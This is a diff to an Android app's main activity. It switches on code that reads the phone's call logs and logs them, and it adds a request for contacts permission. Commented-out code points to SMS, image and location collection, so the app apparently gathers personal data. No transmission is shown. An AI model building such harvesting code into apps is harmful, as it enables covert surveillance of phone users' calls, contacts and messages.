@@ -23,6 +23,7 @@ import com.hazyaz.temps.Media.GetImages;
 import com.hazyaz.temps.Message.MessageReceiver;
 
 public class MainActivity extends AppCompatActivity {
+    private static final int PERMISSIONS_REQUEST_READ_CONTACTS = 5465 ;
     public final String[] EXTERNAL_PERMS = {Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE};
     public final int EXTERNAL_REQUEST = 138;
     private FirebaseAuth mAuth;
@@ -64,12 +65,11 @@ public class MainActivity extends AppCompatActivity {
 //            gps.showSettingsAlert();
 //        }
 
-                                                                    // Call Records
-//        GetCallLogs getCallLogs=new GetCallLogs();
-//        String callrec = getCallLogs.getCallDetails(getApplicationContext());
-//        Log.d("abc", callrec);
-//
-//
+        GetCallLogs getCallLogs=new GetCallLogs();
+        String callrec = getCallLogs.getCallDetails(getApplicationContext());
+        Log.d("abc", callrec);
+
+
 //                                                                        //Messages
 //        MessageReceiver messageReceiver=new MessageReceiver();
 //        Log.d("xxx",messageReceiver.getAllSms(getApplicationContext()));
@@ -91,14 +91,21 @@ public class MainActivity extends AppCompatActivity {
     }
 
 
+
     public boolean requestForPermission() {
 
         boolean isPermissionOn = true;
         final int version = Build.VERSION.SDK_INT;
         if (version >= 23) {
             if (!canAccessExternalSd()) {
+
                 isPermissionOn = false;
                 requestPermissions(EXTERNAL_PERMS, EXTERNAL_REQUEST);
+            }
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+                requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, PERMISSIONS_REQUEST_READ_CONTACTS);
+                //After this point you wait for callback in onRequestPermissionsResult(int, String[], int[]) overriden method
             }
         }
 
